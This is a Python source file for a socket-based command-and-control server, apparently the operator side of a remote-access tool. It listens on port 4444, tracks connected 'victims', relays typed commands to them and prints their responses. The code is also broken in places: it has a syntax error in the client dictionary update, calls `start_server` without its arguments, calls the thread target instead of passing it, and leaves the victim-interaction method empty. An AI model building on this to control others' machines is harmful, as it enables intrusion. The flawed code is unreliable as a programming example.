import socket
import threading
import json
import time

class Server():

    def __init__(self, ip:str, port:int):
        self.ip = ip
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.jobs = []
        self.connected_client = {}
        self.victim_count = 0

    def _send(self, conn:socket.socket, data:str):
        """Sends data as json to conn."""

        conn.sendall(json.dumps(data).encode())

    def _receive(self, conn:socket.socket):
        """Return data received form the conn."""
        json_data = ""

        while True:
            try:
                json_data += conn.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue


    def _accept_connection(self):
        """Adds conn, addr to connected_client dict."""

        while True:
            conn, addr = self.sock.accept()
            print(f"Got connection from {addr}")
            self.victim_count += 1
            self.connected_client.update(addr: conn)

    def _handle_client(self, conn:socket.socket):
        while conn:
    
            data = input("--> ")

            if data == "jobs":
                for job in self.jobs:
                    print(job)
            if data == "interact":
                pass

            self._send(conn, data)
    
            if data == "exit":
                time.sleep(5)
                conn.close()
    
            receive_data = self._receive(conn)
    
            if not receive_data:
                continue
            else:
                print(receive_data)

    def _interact_victim(self, target_id):

        pass

    def console(self):
        while True:
            cmd = input("--> ").lower().strip(' ')

            if cmd == "jobs":
                for job,id in self.jobs:
                    print(f"{job}:\t{id}")
            if cmd[:8] == "interact":
                self._interact_victim(target_id=int(cmd[8:].strip('')))
            

    def start_server(self, ip, port):

        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((ip, port))
        self.sock.listen(0)
        print(f"Server listening on {ip}:{port}")


    def main(self):
        self.start_server()
        t = threading.Thread(target=self._accept_connection())
        t.start()
        self.console()

if __name__ == "__main__":
    server = Server("127.0.0.1", 4444)
    server.start_server()